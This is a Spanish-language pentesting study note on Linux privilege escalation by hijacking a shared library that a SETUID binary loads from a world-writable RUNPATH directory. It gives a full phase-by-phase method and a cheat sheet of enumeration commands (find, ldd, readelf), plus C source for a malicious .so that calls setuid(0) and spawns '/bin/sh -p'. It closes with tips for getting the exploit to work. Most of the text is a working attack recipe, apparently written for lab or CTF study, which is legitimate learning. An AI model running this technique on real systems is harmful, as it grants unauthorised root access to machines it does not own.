---
tags:
  - linux
  - privex
---
## Conceptos Clave (TL;DR)

- Un binario SETUID con una dependencia de libreria `.so` en una ruta **escribible por todos los usuarios** puede ser explotado colocando una libreria maliciosa en esa ruta, que se cargara con privilegios de root al ejecutar el binario.
- El campo `RUNPATH` (o `RPATH`) en el ELF del binario define rutas de busqueda de librerias con **prioridad** sobre las rutas del sistema (`/etc/ld.so.conf`). Si esa ruta es world-writable, el vector existe.
- El flujo de ataque es: identificar la funcion exportada que el binario llama -> compilar un `.so` malicioso que implemente esa misma funcion -> escribirlo en la ruta privilegiada -> ejecutar el binario SETUID para escalar privilegios.
- La funcion maliciosa ejecuta `setuid(0)` + `system("/bin/sh -p")` para obtener una shell interactiva como root.

## Herramientas Clave

| Herramienta | Proposito en este vector |
|---|---|
| `ldd` | Lista las dependencias `.so` de un binario y sus rutas de carga resueltas |
| `readelf` | Inspecciona el ELF del binario; extrae el campo `RUNPATH`/`RPATH` |
| `gcc` | Compila el codigo C malicioso como Position-Independent Shared Object |
| `ls -la` | Verifica permisos del directorio objetivo (world-writable) |
| `cp` | Copia una libreria existente para identificar que funcion falta (error lookup) |

## Metodologia Paso a Paso

### Fase 1 - Identificacion del Binario SETUID Vulnerable

Buscar binarios con el bit SETUID activo y propietario root. El bit `s` en los permisos indica SETUID.

```bash
# Buscar todos los binarios SETUID propiedad de root en el sistema
find / -user root -perm -4000 -type f 2>/dev/null
```

Una vez identificado el objetivo, confirmar que tiene dependencias `.so` no estandar.

### Fase 2 - Enumeracion de Dependencias y RUNPATH

Usar `ldd` para resolver las dependencias del binario. Una ruta no estandar (fuera de `/lib`, `/usr/lib`) es sospechosa.

```bash
# Listar dependencias del binario y sus rutas resueltas
ldd <SUID_BINARY>
```

Confirmar si la ruta de esa libreria esta definida como RUNPATH en el ELF y si esa ruta es escribible.

```bash
# Extraer el campo RUNPATH/RPATH del ELF del binario
readelf -d <SUID_BINARY> | grep PATH
```

```bash
# Verificar permisos del directorio definido en RUNPATH
ls -la <RUNPATH_DIR>
```

Si el directorio tiene permisos `drwxrwxrwx` (world-writable), el ataque es viable.

### Fase 3 - Identificacion de la Funcion Requerida

Hay que saber exactamente que funcion exportada necesita el binario para compilar el `.so` malicioso con la firma correcta. Se hace copiando una libreria legitima en la ruta y ejecutando el binario para leer el error de symbol lookup.

```bash
# Copiar libreria estandar al directorio RUNPATH para forzar el error de simbolo
cp /lib/x86_64-linux-gnu/libc.so.6 <RUNPATH_DIR>/<LIBNAME>.so

# Ejecutar el binario para que revele el simbolo/funcion que no encuentra
<SUID_BINARY>
```

El error `undefined symbol: <FUNCTION_NAME>` revela el nombre exacto de la funcion a implementar.

### Fase 4 - Creacion y Compilacion de la Libreria Maliciosa

Escribir un archivo C que implemente la funcion identificada. Dentro de ella, elevar privilegios y lanzar una shell.

```bash
# Compilar el .so malicioso como Position-Independent Code y escribirlo directamente en RUNPATH
gcc <MALICIOUS_SRC>.c -fPIC -shared -o <RUNPATH_DIR>/<LIBNAME>.so
```

### Fase 5 - Ejecucion y Obtencion de Shell como Root

Ejecutar el binario SETUID. El dynamic linker cargara el `.so` malicioso desde RUNPATH (prioridad maxima) y se ejecutara `setuid(0)` + `/bin/sh -p`.

```bash
# Ejecutar el binario SETUID para disparar la carga de la libreria maliciosa
<SUID_BINARY>
```

## Cheat Sheet de Comandos

```bash
# FASE 1: Encontrar binarios SETUID de root
find / -user root -perm -4000 -type f 2>/dev/null
```

```bash
# FASE 2a: Resolver dependencias .so del binario objetivo
ldd <SUID_BINARY>
```

```bash
# FASE 2b: Extraer RUNPATH del ELF para confirmar la ruta de busqueda prioritaria
readelf -d <SUID_BINARY> | grep PATH
```

```bash
# FASE 2c: Confirmar que el directorio RUNPATH es world-writable
ls -la <RUNPATH_DIR>/
```

```bash
# FASE 3a: Plantar una .so legitima para provocar el error de symbol lookup
cp /lib/x86_64-linux-gnu/libc.so.6 <RUNPATH_DIR>/<LIBNAME>.so
```

```bash
# FASE 3b: Ejecutar el binario para revelar el nombre de la funcion requerida (leer el error)
<SUID_BINARY>
# Output esperado: "undefined symbol: <FUNCTION_NAME>"
```

```c
// FASE 4a: Codigo fuente de la libreria maliciosa (guardar como <MALICIOUS_SRC>.c)
// Reemplazar <FUNCTION_NAME> con el simbolo extraido en la fase anterior
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void <FUNCTION_NAME>() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
# FASE 4b: Compilar como shared object con -fPIC (Position-Independent Code) y -shared
# -fPIC: necesario para codigo que se cargara en direcciones arbitrarias de memoria
# -shared: indica a gcc que genere una libreria compartida (.so) en lugar de un ejecutable
# Output directo al path RUNPATH para sobrescribir la .so plantada anteriormente
gcc <MALICIOUS_SRC>.c -fPIC -shared -o <RUNPATH_DIR>/<LIBNAME>.so
```

```bash
# FASE 5: Ejecutar el binario SETUID para cargar la libreria maliciosa y obtener root shell
<SUID_BINARY>

# Verificar privilegios obtenidos
id
# uid=0(root) confirma escalada exitosa
```

## "Gotchas" y Troubleshooting

- **Nombre de funcion exacto**: La funcion en tu `.c` malicioso debe tener exactamente el mismo nombre que el simbolo reportado en el error `undefined symbol:`. Un typo aqui hara que el binario siga fallando.
- **Nombre de la .so exacto**: El archivo compilado debe tener exactamente el mismo nombre que la libreria listada en `ldd` (ej. `libshared.so`). Si el nombre no coincide, el dynamic linker no la tomara.
- **RUNPATH vs RPATH**: `RUNPATH` es el campo moderno; `RPATH` es el legacy. Ambos son explotables de la misma forma con `readelf -d`. `grep -E "RUNPATH|RPATH"` para cubrir ambos casos.
- **RUNPATH vs LD_LIBRARY_PATH**: `RUNPATH` tiene menor prioridad que `LD_LIBRARY_PATH` pero mayor que `/etc/ld.so.cache`. Para binarios SETUID, el sistema suele ignorar `LD_LIBRARY_PATH` por seguridad, por lo que `RUNPATH` es el vector viable aqui.
- **Flag `-p` en `/bin/sh`**: Critico. La flag `-p` (privileged mode) hace que `sh` respete el EUID real del proceso (root en este caso). Sin `-p`, algunas shells modernas dropean los privilegios SETUID automaticamente al invocar la shell.
- **Prerequisito de escritura**: El vector requiere que el directorio definido en `RUNPATH` sea escribible por el usuario actual. Si no lo es, el ataque no es aplicable.
- **Arquitectura del .so**: El `.so` compilado debe coincidir con la arquitectura del binario objetivo (x86\_64, ARM, etc.). Compilar en la misma maquina objetivo garantiza esto.
- **Verificar con `file`**: Si hay dudas sobre la arquitectura, usar `file <SUID_BINARY>` para confirmar antes de compilar.